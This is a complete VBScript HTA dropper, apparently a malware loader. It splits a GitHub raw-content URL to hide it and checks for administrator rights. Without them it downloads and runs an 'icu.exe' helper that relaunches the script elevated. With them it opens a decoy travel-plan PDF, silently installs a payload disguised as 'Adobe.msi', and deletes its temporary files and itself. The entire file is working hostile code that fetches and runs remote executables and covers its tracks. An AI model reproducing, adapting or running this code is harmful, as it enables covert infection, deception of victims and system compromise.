Dim fso, sh, qs, selfPath, isAdmin, http, stream
Dim p1, p2, p3, p4, p5
Dim msiUrl, msiPath, pdfUrl, pdfPath, tmpExe, icuUrl

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
qs  = Chr(34)

p1 = "https://raw.g"
p2 = "ithubuserco"
p3 = "ntent.com/rotalbilly5"
p4 = "-sketch/Dream/"
p5 = "main/"

selfPath = location.href
selfPath = Replace(selfPath, "file:///", "")
selfPath = Replace(selfPath, "%20", " ")
selfPath = Replace(selfPath, "/", "\")

' --- admin probe ---
isAdmin = False
Dim tmpOut, fIn, contents
tmpOut = sh.ExpandEnvironmentStrings("%TEMP%") & "\_p.txt"
On Error Resume Next
sh.Run "%COMSPEC% /c whoami /groups > " & qs & tmpOut & qs, 0, True
Err.Clear
On Error GoTo 0

If fso.FileExists(tmpOut) Then
    Set fIn = fso.OpenTextFile(tmpOut, 1)
    contents = fIn.ReadAll
    fIn.Close
    If InStr(contents, "S-1-16-12288") > 0 Then isAdmin = True
    fso.DeleteFile tmpOut, True
End If
Err.Clear

' ============================================================
'  NOT ADMIN - download icu, write r.bat, fire icu
' ============================================================
If Not isAdmin Then
    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
    icuUrl = p1 & p2 & p3 & p4 & p5 & "icu.exe"

    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", icuUrl, False
    http.Send
    Err.Clear
    On Error GoTo 0

    If http.Status = 200 Then
        Dim icuSaved
        icuSaved = False

        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile tmpExe, 2
        Err.Clear
        stream.Close
        On Error GoTo 0

        If fso.FileExists(tmpExe) Then
            icuSaved = True
        Else
            Dim icuB64Path, icuB64Text, icuFh, icuXml, icuNode
            icuB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64"
            On Error Resume Next
            Set icuXml = CreateObject("MSXML2.DOMDocument")
            Set icuNode = icuXml.createElement("b")
            icuNode.dataType = "bin.base64"
            icuNode.nodeTypedValue = http.ResponseBody
            icuB64Text = icuNode.text
            Err.Clear
            On Error GoTo 0

            If icuB64Text <> "" Then
                Set icuFh = fso.CreateTextFile(icuB64Path, True)
                icuFh.Write icuB64Text
                icuFh.Close
                sh.Run "%COMSPEC% /c certutil.exe -decode """ & icuB64Path & """ """ & tmpExe & """", 0, True
                If fso.FileExists(tmpExe) Then icuSaved = True
                On Error Resume Next
                fso.DeleteFile icuB64Path, True
                Err.Clear
                On Error GoTo 0
            End If
        End If

        If icuSaved Then
            Dim batPath, batContent, bf, shortBat
            batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat"
            batContent = "@echo off" & vbCrLf & "start """" /min mshta.exe """ & selfPath & """" & vbCrLf

            On Error Resume Next
            Set bf = fso.CreateTextFile(batPath, True)
            bf.Write batContent
            bf.Close
            Err.Clear
            On Error GoTo 0

            If fso.FileExists(batPath) Then
                On Error Resume Next
                shortBat = fso.GetFile(batPath).ShortPath
                If Err.Number <> 0 Then shortBat = batPath
                Err.Clear
                On Error GoTo 0

                On Error Resume Next
                sh.Run qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs, 0, False
                Err.Clear
                On Error GoTo 0

                sh.Run "%COMSPEC% /c timeout /t 20 /nobreak >nul & del /f /q """ & batPath & """", 0, False
            End If
        End If
    End If

' ============================================================
'  ADMIN - cleanup + payload
' ============================================================
Else
    ' --- cleanup icu.exe and r.bat ---
    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
    On Error Resume Next
    If fso.FileExists(tmpExe) Then fso.DeleteFile tmpExe, True
    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then
        fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
    End If
    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64") Then
        fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64", True
    End If
    Err.Clear
    On Error GoTo 0

    ' --- PDF ---
    pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"

    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", pdfUrl, False
    http.Send
    Err.Clear
    On Error GoTo 0

    If http.Status = 200 Then
        Dim pdfSaved
        pdfSaved = False

        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile pdfPath, 2
        Err.Clear
        stream.Close
        On Error GoTo 0

        If fso.FileExists(pdfPath) Then
            pdfSaved = True
        Else
            Dim pdfB64Path, pdfB64Text, pdfFh, pdfXml, pdfNode
            pdfB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\pdf.b64"
            On Error Resume Next
            Set pdfXml = CreateObject("MSXML2.DOMDocument")
            Set pdfNode = pdfXml.createElement("b")
            pdfNode.dataType = "bin.base64"
            pdfNode.nodeTypedValue = http.ResponseBody
            pdfB64Text = pdfNode.text
            Err.Clear
            On Error GoTo 0
            If pdfB64Text <> "" Then
                Set pdfFh = fso.CreateTextFile(pdfB64Path, True)
                pdfFh.Write pdfB64Text
                pdfFh.Close
                sh.Run "%COMSPEC% /c certutil.exe -decode """ & pdfB64Path & """ """ & pdfPath & """", 0, True
                If fso.FileExists(pdfPath) Then pdfSaved = True
                On Error Resume Next
                fso.DeleteFile pdfB64Path, True
                Err.Clear
                On Error GoTo 0
            End If
        End If

        If pdfSaved Then
            sh.Run "msedge.exe """ & pdfPath & """", 1, False
        End If
    End If

    ' --- MSI ---
    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"

    On Error Resume Next
    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", msiUrl, False
    http.Send
    Err.Clear
    On Error GoTo 0

    If http.Status = 200 Then
        Dim saved
        saved = False

        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile msiPath, 2
        Err.Clear
        stream.Close
        On Error GoTo 0

        If fso.FileExists(msiPath) Then
            saved = True
        Else
            Dim msiB64Path, msiB64Text, msiFh, msiXml, msiNode
            msiB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
            On Error Resume Next
            Set msiXml = CreateObject("MSXML2.DOMDocument")
            Set msiNode = msiXml.createElement("b")
            msiNode.dataType = "bin.base64"
            msiNode.nodeTypedValue = http.ResponseBody
            msiB64Text = msiNode.text
            Err.Clear
            On Error GoTo 0
            If msiB64Text <> "" Then
                Set msiFh = fso.CreateTextFile(msiB64Path, True)
                msiFh.Write msiB64Text
                msiFh.Close
                sh.Run "%COMSPEC% /c certutil.exe -decode """ & msiB64Path & """ """ & msiPath & """", 0, True
                If fso.FileExists(msiPath) Then saved = True
                On Error Resume Next
                fso.DeleteFile msiB64Path, True
                Err.Clear
                On Error GoTo 0
            End If
        End If

        If saved Then
            sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
            ' deferred MSI cleanup — 90s after install starts
            sh.Run "%COMSPEC% /c timeout /t 90 /nobreak >nul & del /f /q """ & msiPath & """", 0, False
        End If
    End If

    ' ============================================================
    '  DEFERRED HTA SELF-DELETE — spawned once, from the elevated pass
    '  Fires 60s from now, after the payload is done.
    '  Uses selfPath derived from location.href — works regardless of the HTA filename.
    ' ============================================================
    sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul & del /f /q """ & selfPath & """", 0, False
End If
